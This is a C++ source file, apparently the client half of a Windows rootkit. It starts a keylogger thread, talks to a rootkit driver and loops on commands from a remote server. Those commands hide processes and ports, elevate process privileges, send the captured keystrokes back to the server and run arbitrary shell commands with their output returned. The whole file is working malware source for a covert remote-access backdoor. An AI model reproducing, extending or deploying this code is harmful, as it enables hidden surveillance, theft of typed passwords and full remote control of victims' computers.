#include "driver_handler.h"
#include "network_handler.h"
#include "common.h"
#include "keylog.h"
#include <thread>

static void executeCommands(Driver::DriverHandler& rootkit_handler, Network::RootkitClient& network_client);

int main(int argc, const char* argv[]) {

	//rootkit_handler: interacts with rootkit driver
	Driver::DriverHandler rootkit_handler;

	if (rootkit_handler.hDevice == INVALID_HANDLE_VALUE)
		return logError("couldn't open a handle");

	//network_client: interacts with the server.
	Network::RootkitClient network_client;

	//keylogger thread
	std::thread t(Logger::logger_thread);

	//execute remote commands
	executeCommands(rootkit_handler, network_client);
	
	//terminate keylogger thread
	Logger::log_running = false;
	t.join();

	//Cleanup in network_client deconstructor...
	return 0;
}

static void executeCommands(Driver::DriverHandler& rootkit_handler, Network::RootkitClient& network_client) {
	while (true) {

	std::string buf;
	network_client.ReceiveText(buf);

	std::cout << "recieved command over network: "<< buf << "\n";

	if (buf.rfind("$testConnection",0) == 0) {

		buf = buf.substr(buf.find(" ") + 1);

		if (!rootkit_handler.check_connection(const_cast<char*>(buf.c_str())))
			network_client.SendText("Problem asserting connection with driver");

		else {
			network_client.SendText("Connected! message echoed successfully");
		}

	}
	else if (buf.rfind("$hideProcess", 0) == 0) {

		buf = buf.substr(buf.find(" ") + 1);

		if (!rootkit_handler.hide_process(const_cast<char*>(buf.c_str())))
			network_client.SendText("Couldn't hide process");

		else {
			network_client.SendText("Process hidden successfully");
		}

	}
	else if (buf.rfind("$elevateProcess", 0) == 0) {

		buf = buf.substr(buf.find(" ") + 1);

		if (!rootkit_handler.elevate_process(const_cast<char*>(buf.c_str())))
			network_client.SendText("Couldn't elevate process privillages");

		else {
			network_client.SendText("Process privillages elevated");
		}

	}
	else if (buf.rfind("$hidePort", 0) == 0) {

		buf = buf.substr(buf.find(" ") + 1);

		if (!rootkit_handler.hide_port(const_cast<char*>(buf.c_str())))
			network_client.SendText("Couldn't hide port");

		else {
			network_client.SendText("Port Hidden!");
		}

	}
	else if (buf.rfind("$keylogger", 0) == 0) {

		std::ifstream ifs(Logger::FILE_NAME);
		std::string content((std::istreambuf_iterator<char>(ifs)),
							(std::istreambuf_iterator<char>()));

		network_client.SendText(content);
	}
	else if (buf.rfind("$shellExecute", 0) == 0) {

		buf = buf.substr(buf.find(" ") + 1);
		network_client.SendText(cmd_exec(buf.c_str()));

	}
	else if (buf.rfind("$exit", 0) == 0) {
		break;
	}
	else {
		std::cout << "command not recognized\n";
	}


	}


}
